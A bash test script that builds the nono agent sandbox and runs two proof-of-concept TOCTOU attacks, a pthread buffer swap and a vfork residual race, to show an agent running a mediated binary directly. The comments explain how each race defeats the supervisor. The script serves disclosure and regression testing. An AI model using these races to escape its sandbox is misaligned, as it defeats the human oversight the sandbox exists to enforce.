#!/usr/bin/env bash
# run_test.sh — builds nono, compiles attackers, runs both bypass experiments.
#
# Two attack vectors are tested:
#
#   Attack 1 — pthread (original bypass, PR #20 comment 4337852261):
#     The agent spawns a sibling thread that swaps the execve pathname buffer.
#     Fixed by the Threads>1 check in commit 6c006fb: a process calling execve
#     while multi-threaded is denied with reason multi_threaded_unsafe.
#     Expected result after fix: 0 bypasses.
#
#   Attack 2 — vfork residual (this script):
#     The agent is multi-threaded but uses vfork to produce a single-threaded
#     child (new tgid, Threads=1).  The child calls execve, trapping to the
#     supervisor which sees Threads=1 and responds CONTINUE.  Meanwhile the
#     parent's swap thread — in a different tgid, not paused — races the
#     shared address-space buffer.  The kernel re-reads the mutated buffer and
#     execs the real binary.
#     Expected result after fix: still bypasses (residual not yet closed).
#
# Exit codes:
#   0 — vfork bypass confirmed (residual demonstrated)
#   1 — vfork bypass not observed in the attempt count
#   2 — environment error (baselines failed)
set -euo pipefail

WORKSPACE=/workspace
POC_DIR="$WORKSPACE/poc"
BUILD_TMP=/tmp/nono-poc-bin

echo "=== Building nono ==="
cd "$WORKSPACE"
cargo build --release -p nono-cli -p nono-shim --bin nono --bin nono-shim 2>&1 | {
    grep -E "^(Compiling|Finished|error)" || true
} | tail -5

NONO="$WORKSPACE/target/release/nono"
SHIM="$WORKSPACE/target/release/nono-shim"
[ -x "$NONO" ] || { echo "ERROR: nono binary not found"; exit 2; }
[ -x "$SHIM" ] || { echo "ERROR: nono-shim binary not found"; exit 2; }
echo "nono:      $NONO"
echo "nono-shim: $SHIM"

echo ""
echo "=== Building attacker binaries ==="
mkdir -p "$BUILD_TMP"
gcc -O2 -pthread -o "$BUILD_TMP/attacker"       "$POC_DIR/attacker.c"
# vfork is standard POSIX on Linux; -Wno-deprecated-declarations silences
# macOS clang if this file is ever compiled outside the container.
gcc -O2 -pthread -Wno-deprecated-declarations \
    -o "$BUILD_TMP/vfork_attacker" "$POC_DIR/vfork_attacker.c"
echo "attackers built in $BUILD_TMP"

echo ""
echo "=== Setting up test environment ==="
# HOME must not be a prefix of anything in filesystem.allow — nono refuses to
# grant a path that contains its own state root (~/.nono).
rm -rf /poc-home /poc-agent-bin /poc-work
HOME_DIR=/poc-home
WORKDIR=/poc-work
BINDIR=/poc-agent-bin
mkdir -p "$HOME_DIR" "$BINDIR" "$WORKDIR"

# Place attackers in BINDIR so Landlock (which allows BINDIR) permits exec.
cp "$BUILD_TMP/attacker"       "$BINDIR/attacker"
cp "$BUILD_TMP/vfork_attacker" "$BINDIR/vfork_attacker"
chmod +x "$BINDIR/attacker" "$BINDIR/vfork_attacker"

# testbin: the mediated binary (prints REAL_BINARY_RAN when executed directly)
TESTBIN="$BINDIR/testbin"
printf '#!/bin/sh\necho REAL_BINARY_RAN\n' > "$TESTBIN"
chmod +x "$TESTBIN"
TESTBIN_CANONICAL=$(realpath "$TESTBIN")

PROFILE="$HOME_DIR/profile.json"
TESTBIN_JSON=$(printf '%s' "$TESTBIN_CANONICAL")
BINDIR_JSON=$(printf '%s' "$BINDIR")
WORKDIR_JSON=$(printf '%s' "$WORKDIR")

cat > "$PROFILE" <<PROFILE_EOF
{
  "meta": { "name": "toctou-test", "version": "1.0" },
  "filesystem": {
    "allow": ["$BINDIR_JSON", "$WORKDIR_JSON", "/usr", "/bin", "/lib", "/lib64", "/etc", "/proc"]
  },
  "network": { "block": false },
  "workdir": { "access": "readwrite" },
  "mediation": {
    "commands": [
      {
        "name": "testbin",
        "binary_path": "$TESTBIN_JSON",
        "intercept": [
          {
            "args_prefix": [],
            "action": {
              "type": "respond",
              "stdout": "MEDIATED_RESPONSE\n",
              "exit_code": 0
            }
          }
        ]
      }
    ]
  }
}
PROFILE_EOF

echo "testbin:   $TESTBIN_CANONICAL"
echo "home:      $HOME_DIR"

# Helper: run a command inside a nono session with an isolated HOME.
run_in_session() {
    HOME="$HOME_DIR" \
    "$NONO" run --silent --allow-cwd \
        --profile "$PROFILE" --workdir "$WORKDIR" -- \
        "$@" 2>&1 || true
}

echo ""
echo "=== Baselines ==="
printf "PATH-based invocation (expect MEDIATED_RESPONSE): "
B=$(run_in_session sh -c "testbin")
if echo "$B" | grep -q "MEDIATED_RESPONSE"; then echo "OK"
else echo "UNEXPECTED: $B"; echo "ERROR: baseline broken"; exit 2; fi

printf "Direct path no-race (expect DENIED):              "
B=$(run_in_session sh -c "$TESTBIN_CANONICAL")
if echo "$B" | grep -q "REAL_BINARY_RAN"; then
    echo "FAIL — filter not active"
    exit 2
else echo "OK"; fi

# ---------------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║  Attack 1: pthread TOCTOU (original bypass, should be BLOCKED)      ║"
echo "║                                                                      ║"
echo "║  Agent spawns a sibling thread to race the execve pathname buffer.   ║"
echo "║  Fixed by Threads>1 check (commit 6c006fb): if the calling tgid has  ║"
echo "║  >1 threads, execve is denied with reason multi_threaded_unsafe.     ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
ATTEMPTS=300

PTHREAD_RESULT=$(HOME="$HOME_DIR" \
    DIRECT_PATH="$TESTBIN_CANONICAL" \
    ATTACKER="$BINDIR/attacker" \
    ATTEMPTS="$ATTEMPTS" \
    "$NONO" run --silent --allow-cwd \
        --profile "$PROFILE" --workdir "$WORKDIR" -- \
        sh -c '
            SHIM_PATH=$(which testbin 2>/dev/null)
            [ -n "$SHIM_PATH" ] || { echo "ERROR: shim not found" >&2; exit 1; }
            echo "shim_path:   $SHIM_PATH" >&2
            echo "direct_path: $DIRECT_PATH" >&2
            "$ATTACKER" "$SHIM_PATH" "$DIRECT_PATH" "$ATTEMPTS"
        ' 2>&1 || true)

echo "$PTHREAD_RESULT" | grep -E "BYPASS|Results|Mediated|Denied|Other" || true
PTHREAD_BYPASSES=$(echo "$PTHREAD_RESULT" | grep -c "BYPASS — real binary ran" || true)
echo ""
if [ "$PTHREAD_BYPASSES" -gt 0 ]; then
    echo "  Attack 1 result: BYPASS ($PTHREAD_BYPASSES hits) — Threads fix not applied or not working"
else
    echo "  Attack 1 result: BLOCKED — Threads>1 check is working"
fi

# ---------------------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║  Attack 2: vfork residual (Threads==1 child, shared-MM parent race) ║"
echo "║                                                                      ║"
echo "║  Agent is multi-threaded (parent tgid has Thread B swapping buf).   ║"
echo "║  Uses vfork to produce a single-threaded child (new tgid,           ║"
echo "║  Threads=1).  Child calls execve — supervisor sees Threads=1 →      ║"
echo "║  CONTINUE without re-read.  Thread B in the parent races the shared ║"
echo "║  address space buffer.  Kernel re-reads mutated buffer → bypass.    ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"

VFORK_RESULT=$(HOME="$HOME_DIR" \
    DIRECT_PATH="$TESTBIN_CANONICAL" \
    ATTACKER="$BINDIR/vfork_attacker" \
    ATTEMPTS="$ATTEMPTS" \
    "$NONO" run --silent --allow-cwd \
        --profile "$PROFILE" --workdir "$WORKDIR" -- \
        sh -c '
            SHIM_PATH=$(which testbin 2>/dev/null)
            [ -n "$SHIM_PATH" ] || { echo "ERROR: shim not found" >&2; exit 1; }
            echo "shim_path:   $SHIM_PATH" >&2
            echo "direct_path: $DIRECT_PATH" >&2
            "$ATTACKER" "$SHIM_PATH" "$DIRECT_PATH" "$ATTEMPTS"
        ' 2>&1 || true)

echo "$VFORK_RESULT" | grep -E "BYPASS|Results|Mediated|Denied|Other|vfork" | grep -v "^shim_path" || true
VFORK_BYPASSES=$(echo "$VFORK_RESULT" | grep -c "BYPASS — real binary ran" || true)
echo ""

echo "═══════════════════════════════════════════════════════════════════════"
echo " Summary ($ATTEMPTS attempts each)"
echo "═══════════════════════════════════════════════════════════════════════"
printf " Attack 1 (pthread): "
if [ "$PTHREAD_BYPASSES" -gt 0 ]; then
    printf "BYPASS (%d hits) — Threads fix missing or broken\n" "$PTHREAD_BYPASSES"
else
    printf "BLOCKED (0 hits)  — Threads>1 check working ✓\n"
fi
printf " Attack 2 (vfork):   "
if [ "$VFORK_BYPASSES" -gt 0 ]; then
    printf "BYPASS (%d hits) — residual confirmed ✗\n" "$VFORK_BYPASSES"
else
    printf "not observed in %d attempts (try more, or timing needs tuning)\n" "$ATTEMPTS"
fi
echo "═══════════════════════════════════════════════════════════════════════"

# Exit 0 if the vfork residual was demonstrated, 1 if not yet observed.
[ "$VFORK_BYPASSES" -gt 0 ]
